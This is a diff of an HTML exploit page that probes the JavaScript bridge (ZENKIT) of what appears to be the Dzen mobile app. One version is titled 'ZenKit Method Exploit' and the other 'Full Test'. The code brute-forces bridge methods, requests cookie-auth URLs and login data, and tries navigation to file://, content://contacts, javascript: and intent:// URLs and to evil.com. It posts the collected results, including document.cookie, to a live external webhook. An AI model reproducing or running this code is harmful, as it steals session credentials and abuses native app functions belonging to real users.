@@ -3,461 +3,288 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ZenKit Method Exploit</title>
+    <title>ZenKit Full Test</title>
     <style>
         body {
             font-family: monospace;
-            padding: 15px;
+            padding: 10px;
             background: #0d1117;
             color: #c9d1d9;
-            font-size: 13px;
+            font-size: 12px;
         }
-        h1 { color: #f85149; font-size: 16px; }
-        h2 { color: #58a6ff; font-size: 14px; margin-top: 20px; }
         #results {
             background: #161b22;
-            padding: 15px;
-            border-radius: 8px;
+            padding: 10px;
+            border-radius: 6px;
             white-space: pre-wrap;
             word-break: break-all;
-            max-height: 250px;
+            height: 70vh;
             overflow-y: auto;
-            margin: 10px 0;
             border: 1px solid #30363d;
         }
-        .found { color: #3fb950; }
+        .ok { color: #3fb950; }
+        .err { color: #f85149; }
         .warn { color: #d29922; }
-        .error { color: #f85149; }
-        .critical { color: #f85149; font-weight: bold; }
+        .info { color: #58a6ff; }
         button {
-            padding: 8px 12px;
-            margin: 3px;
+            padding: 10px 15px;
+            margin: 5px;
             background: #238636;
             color: #fff;
             border: none;
             border-radius: 6px;
-            cursor: pointer;
-            font-size: 11px;
+            font-size: 12px;
         }
-        .btn-critical { background: #da3633; }
-        .section {
-            margin: 15px 0;
-            padding: 12px;
-            background: #161b22;
-            border-radius: 8px;
-            border: 1px solid #30363d;
-        }
+        .critical { background: #da3633; }
     </style>
 </head>
 <body>
-    <h1>🔓 ZenKit Critical Exploit</h1>
+    <button onclick="testAllMethods()">🔍 Test ALL Methods</button>
+    <button onclick="testNavigate()">🧭 Test navigate()</button>
+    <button onclick="testWithEvents()">📡 Test with Events</button>
+    <button onclick="testOpenMethods()">📱 Test open*()</button>
+    <button class="critical" onclick="sendToWebhook()">📤 Send Results</button>
+    <button onclick="clear()">Clear</button>
     
-    <div class="section">
-        <h2>🔑 AUTH & COOKIES (CRITICAL)</h2>
-        <button class="btn-critical" onclick="tryRequestCookieAuthURL()">requestCookieAuthURL()</button>
-        <button class="btn-critical" onclick="tryLogin()">login()</button>
-        <button class="btn-critical" onclick="tryRefreshConfig()">refreshConfig()</button>
-    </div>
-    
-    <div class="section">
-        <h2>📱 NATIVE ACTIONS</h2>
-        <button onclick="tryNavigate()">navigate()</button>
-        <button onclick="tryOpenSettings()">openSettings()</button>
-        <button onclick="tryOpenBell()">openBell()</button>
-        <button onclick="tryCapturePhoto()">captureDocumentPhoto()</button>
-        <button onclick="tryShare()">share()</button>
-    </div>
-    
-    <div class="section">
-        <h2>📝 DATA MANIPULATION</h2>
-        <button onclick="tryUpdateStorage()">updateStorage()</button>
-        <button onclick="tryArticleUpdate()">articleUpdate()</button>
-        <button onclick="tryInterestSubscribe()">interestSubscribe()</button>
-        <button onclick="tryShowCreatePublication()">showCreatePublicationScreen()</button>
-    </div>
-    
-    <div class="section">
-        <h2>🔍 INFO GATHERING</h2>
-        <button onclick="tryOnReady()">onReady()</button>
-        <button onclick="tryArticleInit()">articleInit()</button>
-        <button onclick="listenEvents()">Listen All Events</button>
-        <button onclick="bruteforceCall()">Bruteforce Params</button>
-    </div>
-    
-    <div id="results">Результаты...</div>
-    
-    <div class="section">
-        <button class="btn-critical" onclick="sendResults()">📤 SEND ALL TO WEBHOOK</button>
-    </div>
+    <div id="results"></div>
 
     <script>
-        var results = document.getElementById('results');
-        var collectedData = { methods: {}, responses: {} };
+        var R = document.getElementById('results');
+        var allResults = {};
         
-        function log(msg, type) {
-            results.innerHTML += '<span class="' + (type || '') + '">' + msg + '</span>\n';
-            results.scrollTop = results.scrollHeight;
-            console.log(msg);
+        function log(m, t) {
+            R.innerHTML += '<span class="'+(t||'')+'">' + m + '</span>\n';
+            R.scrollTop = R.scrollHeight;
         }
+        function clear() { R.innerHTML = ''; }
         
-        function clear() { results.innerHTML = ''; }
-        
-        // ========== CRITICAL: AUTH METHODS ==========
-        
-        function tryRequestCookieAuthURL() {
-            clear();
-            log('=== requestCookieAuthURL() ===\n', 'critical');
-            
-            // Пробуем разные варианты вызова
-            var variants = [
-                function() { return ZENKIT.requestCookieAuthURL(); },
-                function() { return ZENKIT.requestCookieAuthURL({}); },
-                function() { return ZENKIT.requestCookieAuthURL('https://dzen.ru'); },
-                function() { return ZENKIT.requestCookieAuthURL({url: 'https://dzen.ru'}); },
-                function() { return NATIVE_ZENKIT.requestCookieAuthURL(); },
-                function() { return NATIVE_ZENKIT.requestCookieAuthURL(''); }
-            ];
-            
-            variants.forEach(function(fn, i) {
-                try {
-                    log('Variant ' + i + ':', 'warn');
-                    var result = fn();
-                    log('Result: ' + JSON.stringify(result), 'found');
-                    collectedData.responses.cookieAuthURL = result;
-                    
-                    // Если это Promise
-                    if (result && typeof result.then === 'function') {
-                        result.then(function(data) {
-                            log('🔑 PROMISE RESOLVED: ' + JSON.stringify(data), 'critical');
-                            collectedData.responses.cookieAuthURL_resolved = data;
-                            sendResults();
-                        }).catch(function(err) {
-                            log('Promise rejected: ' + err, 'error');
-                        });
-                    }
-                } catch(e) {
-                    log('Error: ' + e.message, 'error');
-                }
-            });
-        }
-        
-        function tryLogin() {
-            clear();
-            log('=== login() ===\n', 'critical');
-            
-            var variants = [
-                function() { return ZENKIT.login(); },
-                function() { return ZENKIT.login({}); },
-                function() { return ZENKIT.login({redirect: 'https://evil.com'}); },
-                function() { return NATIVE_ZENKIT.login(); }
-            ];
-            
-            variants.forEach(function(fn, i) {
-                try {
-                    log('Variant ' + i + ':', 'warn');
-                    var result = fn();
-                    log('Result: ' + JSON.stringify(result), 'found');
-                    
-                    if (result && typeof result.then === 'function') {
-                        result.then(function(data) {
-                            log('🔑 LOGIN DATA: ' + JSON.stringify(data), 'critical');
-                            collectedData.responses.login = data;
-                            sendResults();
-                        }).catch(function(err) {
-                            log('Promise rejected: ' + err, 'error');
-                        });
-                    }
-                } catch(e) {
-                    log('Error: ' + e.message, 'error');
-                }
-            });
-        }
-        
-        function tryRefreshConfig() {
-            clear();
-            log('=== refreshConfig() ===\n', 'warn');
-            
+        async function testMethod(obj, name, method, params) {
+            var key = name + '.' + method;
             try {
-                var result = ZENKIT.refreshConfig();
-                log('Result: ' + JSON.stringify(result), 'found');
+                var result;
+                if (params !== undefined) {
+                    result = obj[method](params);
+                } else {
+                    result = obj[method]();
+                }
                 
+                // Handle promise
                 if (result && typeof result.then === 'function') {
-                    result.then(function(data) {
-                        log('CONFIG DATA: ' + JSON.stringify(data, null, 2), 'critical');
-                        collectedData.responses.config = data;
-                    }).catch(function(err) {
-                        log('Error: ' + err, 'error');
-                    });
+                    try {
+                        var data = await result;
+                        if (data && Object.keys(data).length > 0) {
+                            log('✓ ' + key + '(' + (params ? JSON.stringify(params) : '') + ') = ' + JSON.stringify(data), 'ok');
+                            allResults[key] = data;
+                            return data;
+                        }
+                    } catch(e) {
+                        if (!e.message.includes('not found')) {
+                            log('⚠ ' + key + ' promise error: ' + e.message, 'warn');
+                        }
+                    }
+                } else if (result && Object.keys(result).length > 0) {
+                    log('✓ ' + key + ' = ' + JSON.stringify(result), 'ok');
+                    allResults[key] = result;
+                    return result;
                 }
             } catch(e) {
-                log('Error: ' + e.message, 'error');
+                if (!e.message.includes('not found')) {
+                    log('✗ ' + key + ': ' + e.message, 'err');
+                }
             }
+            return null;
         }
         
-        // ========== NATIVE ACTIONS ==========
-        
-        function tryNavigate() {
+        async function testAllMethods() {
             clear();
-            log('=== navigate() ===\n', 'warn');
+            log('=== TESTING ALL ZENKIT METHODS ===\n', 'info');
+            
+            var methods = Object.keys(ZENKIT).filter(k => typeof ZENKIT[k] === 'function');
+            
+            for (var i = 0; i < methods.length; i++) {
+                var m = methods[i];
+                if (m === 'on' || m === 'off') continue;
+                
+                log('\n--- ' + m + '() ---', 'info');
+                
+                // Test without params
+                await testMethod(ZENKIT, 'ZENKIT', m);
+                
+                // Test with empty object
+                await testMethod(ZENKIT, 'ZENKIT', m, {});
+                
+                // Test with common params
+                if (m.includes('article') || m.includes('Article')) {
+                    await testMethod(ZENKIT, 'ZENKIT', m, {id: '123'});
+                    await testMethod(ZENKIT, 'ZENKIT', m, {articleId: '123'});
+                }
+                if (m.includes('channel') || m.includes('Channel')) {
+                    await testMethod(ZENKIT, 'ZENKIT', m, {channelId: '123'});
+                }
+                if (m.includes('navigate') || m.includes('open') || m.includes('url')) {
+                    await testMethod(ZENKIT, 'ZENKIT', m, {url: 'https://dzen.ru'});
+                    await testMethod(ZENKIT, 'ZENKIT', m, 'https://dzen.ru');
+                }
+            }
+            
+            log('\n\n=== SUMMARY ===', 'info');
+            log('Methods with data: ' + Object.keys(allResults).length, 'ok');
+            log(JSON.stringify(allResults, null, 2), 'ok');
+        }
+        
+        async function testNavigate() {
+            clear();
+            log('=== NAVIGATE TESTS ===\n', 'info');
             
             var urls = [
-                'https://evil.com',
-                'dzen://settings',
-                'dzen://profile',
-                '/settings',
-                '/profile',
-                'file:///etc/passwd'
+                // Internal navigation
+                {url: '/settings'},
+                {url: '/profile'},
+                {url: '/notifications'},
+                {url: 'dzen://settings'},
+                {url: 'dzen://profile'},
+                
+                // External
+                {url: 'https://google.com'},
+                {url: 'https://evil.com', external: true},
+                {url: 'https://evil.com', inApp: false},
+                
+                // File access attempts
+                {url: 'file:///sdcard/'},
+                {url: 'file:///data/data/ru.zen.android/'},
+                {url: 'content://contacts/people'},
+                
+                // Javascript
+                {url: 'javascript:alert(1)'},
+                
+                // Intent
+                {url: 'intent://evil.com#Intent;scheme=https;end'},
             ];
             
-            urls.forEach(function(url) {
-                try {
-                    log('Trying: ' + url, '');
-                    var result = ZENKIT.navigate(url);
-                    log('Result: ' + JSON.stringify(result), 'found');
-                } catch(e) {
-                    log('Error: ' + e.message, 'error');
-                }
-            });
+            for (var i = 0; i < urls.length; i++) {
+                await testMethod(ZENKIT, 'ZENKIT', 'navigate', urls[i]);
+                await new Promise(r => setTimeout(r, 300));
+            }
             
-            // С объектом
-            try {
-                log('\nWith object:', '');
-                var result = ZENKIT.navigate({url: 'https://evil.com', external: true});
-                log('Result: ' + JSON.stringify(result), 'found');
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
+            // Also test as string
+            log('\n--- As string params ---', 'info');
+            await testMethod(ZENKIT, 'ZENKIT', 'navigate', '/settings');
+            await testMethod(ZENKIT, 'ZENKIT', 'navigate', 'https://evil.com');
         }
         
-        function tryOpenSettings() {
+        async function testWithEvents() {
             clear();
-            log('=== openSettings() ===\n', 'warn');
-            try {
-                var result = ZENKIT.openSettings();
-                log('Result: ' + JSON.stringify(result), 'found');
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function tryOpenBell() {
-            clear();
-            log('=== openBell() ===\n', 'warn');
-            try {
-                var result = ZENKIT.openBell();
-                log('Result: ' + JSON.stringify(result), 'found');
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function tryCapturePhoto() {
-            clear();
-            log('=== captureDocumentPhoto() ===\n', 'warn');
-            try {
-                var result = ZENKIT.captureDocumentPhoto();
-                log('Result: ' + JSON.stringify(result), 'found');
-                
-                if (result && typeof result.then === 'function') {
-                    result.then(function(data) {
-                        log('📸 PHOTO DATA: ' + JSON.stringify(data), 'critical');
-                        collectedData.responses.photo = data;
-                    }).catch(function(err) {
-                        log('Error: ' + err, 'error');
-                    });
-                }
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function tryShare() {
-            clear();
-            log('=== share() ===\n', 'warn');
+            log('=== EVENT LISTENER TEST ===\n', 'info');
             
-            var variants = [
-                {text: 'Hacked by attacker', url: 'https://evil.com'},
-                {title: 'Check this', text: 'Malicious link', url: 'https://evil.com'},
-                'https://evil.com'
-            ];
-            
-            variants.forEach(function(params, i) {
-                try {
-                    log('Variant ' + i + ': ' + JSON.stringify(params), '');
-                    var result = ZENKIT.share(params);
-                    log('Result: ' + JSON.stringify(result), 'found');
-                } catch(e) {
-                    log('Error: ' + e.message, 'error');
-                }
-            });
-        }
-        
-        // ========== DATA MANIPULATION ==========
-        
-        function tryUpdateStorage() {
-            clear();
-            log('=== updateStorage() ===\n', 'warn');
-            
-            try {
-                // Пробуем записать данные
-                var result = ZENKIT.updateStorage({key: 'evil', value: 'hacked'});
-                log('Write result: ' + JSON.stringify(result), 'found');
-                
-                // Пробуем прочитать
-                var result2 = ZENKIT.updateStorage({action: 'get'});
-                log('Read result: ' + JSON.stringify(result2), 'found');
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function tryArticleUpdate() {
-            clear();
-            log('=== articleUpdate() ===\n', 'warn');
-            try {
-                var result = ZENKIT.articleUpdate({id: '123', liked: true});
-                log('Result: ' + JSON.stringify(result), 'found');
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function tryInterestSubscribe() {
-            clear();
-            log('=== interestSubscribe() ===\n', 'warn');
-            try {
-                var result = ZENKIT.interestSubscribe({interest: 'hacking'});
-                log('Result: ' + JSON.stringify(result), 'found');
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function tryShowCreatePublication() {
-            clear();
-            log('=== showCreatePublicationScreen() ===\n', 'warn');
-            try {
-                var result = ZENKIT.showCreatePublicationScreen();
-                log('Result: ' + JSON.stringify(result), 'found');
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        // ========== INFO GATHERING ==========
-        
-        function tryOnReady() {
-            clear();
-            log('=== onReady() ===\n', 'warn');
-            try {
-                var result = ZENKIT.onReady();
-                log('Result: ' + JSON.stringify(result), 'found');
-                
-                if (result && typeof result.then === 'function') {
-                    result.then(function(data) {
-                        log('READY DATA: ' + JSON.stringify(data, null, 2), 'critical');
-                        collectedData.responses.ready = data;
-                    });
-                }
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function tryArticleInit() {
-            clear();
-            log('=== articleInit() ===\n', 'warn');
-            try {
-                var result = ZENKIT.articleInit();
-                log('Result: ' + JSON.stringify(result), 'found');
-                
-                if (result && typeof result.then === 'function') {
-                    result.then(function(data) {
-                        log('INIT DATA: ' + JSON.stringify(data, null, 2), 'critical');
-                        collectedData.responses.init = data;
-                    });
-                }
-            } catch(e) {
-                log('Error: ' + e.message, 'error');
-            }
-        }
-        
-        function listenEvents() {
-            clear();
-            log('=== Listening to ALL events ===\n', 'warn');
-            
+            // Subscribe to all possible events
             var events = [
-                'ready', 'config', 'user', 'auth', 'login', 'logout',
-                'navigation', 'error', 'data', 'storage', 'message'
+                'ready', 'init', 'config', 'user', 'auth', 'token',
+                'login', 'logout', 'session', 'navigation', 'navigate',
+                'article', 'channel', 'subscription', 'storage', 'data',
+                'error', 'message', 'response', 'callback', 'result',
+                'photo', 'camera', 'share', 'settings', 'bell', 'notification'
             ];
             
-            events.forEach(function(event) {
+            events.forEach(function(evt) {
                 try {
-                    ZENKIT.on(event, function(data) {
-                        log('EVENT [' + event + ']: ' + JSON.stringify(data), 'critical');
-                        collectedData.responses['event_' + event] = data;
+                    ZENKIT.on(evt, function(data) {
+                        log('🔔 EVENT [' + evt + ']: ' + JSON.stringify(data), 'ok');
+                        allResults['event_' + evt] = data;
                     });
-                    log('Subscribed to: ' + event, 'found');
+                    log('Subscribed: ' + evt, 'info');
                 } catch(e) {}
             });
             
-            log('\nWaiting for events...', 'warn');
+            log('\n--- Now calling methods to trigger events ---\n', 'warn');
+            
+            // Trigger methods that might emit events
+            await testMethod(ZENKIT, 'ZENKIT', 'onReady');
+            await testMethod(ZENKIT, 'ZENKIT', 'articleInit');
+            await testMethod(ZENKIT, 'ZENKIT', 'refreshConfig');
+            
+            log('\n⏳ Waiting 5 seconds for events...', 'warn');
+            await new Promise(r => setTimeout(r, 5000));
+            log('Done waiting.', 'info');
         }
         
-        function bruteforceCall() {
+        async function testOpenMethods() {
             clear();
-            log('=== Bruteforce method calls ===\n', 'warn');
+            log('=== TESTING OPEN METHODS ===\n', 'info');
             
-            var methods = Object.keys(ZENKIT);
+            // These might open native UI
+            var openMethods = [
+                ['openSettings', []],
+                ['openBell', []],
+                ['openComments', []],
+                ['openComments', [{articleId: '123'}]],
+                ['openNativeShareMenu', []],
+                ['openNativeShareMenu', [{text: 'test', url: 'https://dzen.ru'}]],
+                ['showCreatePublicationScreen', []],
+                ['captureDocumentPhoto', []],
+                ['share', [{text: 'test'}]],
+                ['share', [{url: 'https://evil.com', text: 'Check this!'}]],
+            ];
             
-            methods.forEach(function(method) {
-                if (typeof ZENKIT[method] === 'function' && method !== 'on' && method !== 'off') {
-                    try {
-                        log('Calling ' + method + '()...', '');
-                        var result = ZENKIT[method]();
-                        
-                        if (result && typeof result.then === 'function') {
-                            result.then(function(data) {
-                                if (data) {
-                                    log('✓ ' + method + ' returned: ' + JSON.stringify(data).substring(0, 200), 'found');
-                                    collectedData.methods[method] = data;
-                                }
-                            }).catch(function(){});
-                        } else if (result) {
-                            log('✓ ' + method + ' = ' + JSON.stringify(result).substring(0, 100), 'found');
-                        }
-                    } catch(e) {}
+            for (var i = 0; i < openMethods.length; i++) {
+                var m = openMethods[i][0];
+                var p = openMethods[i][1];
+                
+                log('\nTrying ' + m + '(' + JSON.stringify(p) + ')...', 'info');
+                
+                try {
+                    var result;
+                    if (p.length === 0) {
+                        result = ZENKIT[m]();
+                    } else {
+                        result = ZENKIT[m](p[0]);
+                    }
+                    
+                    if (result && typeof result.then === 'function') {
+                        result.then(function(data) {
+                            log('✓ ' + m + ' resolved: ' + JSON.stringify(data), 'ok');
+                            allResults[m] = data;
+                        }).catch(function(e) {
+                            log('✗ ' + m + ' rejected: ' + e, 'err');
+                        });
+                    } else {
+                        log('Result: ' + JSON.stringify(result), 'ok');
+                    }
+                } catch(e) {
+                    log('Error: ' + e.message, 'err');
                 }
-            });
+                
+                // Wait a bit between calls
+                await new Promise(r => setTimeout(r, 500));
+            }
         }
         
-        // ========== SEND RESULTS ==========
-        
-        function sendResults() {
-            collectedData.timestamp = new Date().toISOString();
-            collectedData.userAgent = navigator.userAgent;
-            collectedData.url = window.location.href;
-            collectedData.cookies = document.cookie;
+        function sendToWebhook() {
+            var data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                results: allResults,
+                zenkitMethods: Object.keys(ZENKIT),
+                cookies: document.cookie
+            };
             
-            log('\n📤 Sending to webhook...', 'warn');
+            log('\n📤 Sending...', 'warn');
             
             fetch('https://webhook.tuna.am/387WocKA8chxCpAjoA4S1rxg7cV', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify(collectedData)
-            })
-            .then(function() { log('✓ Sent!', 'found'); })
-            .catch(function(e) { log('Error: ' + e, 'error'); });
+                body: JSON.stringify(data)
+            }).then(function() {
+                log('✓ Sent!', 'ok');
+            }).catch(function(e) {
+                log('Error: ' + e, 'err');
+            });
         }
         
-        // Auto-run critical methods
+        // Auto-run
         window.onload = function() {
-            log('Auto-running critical methods...\n', 'warn');
-            listenEvents();
-            
-            setTimeout(function() {
-                tryRequestCookieAuthURL();
-            }, 1000);
+            log('Page loaded. ZENKIT available: ' + (typeof ZENKIT !== 'undefined'), 'info');
+            log('Methods: ' + Object.keys(ZENKIT || {}).join(', '), 'info');
         };
     </script>
 </body>
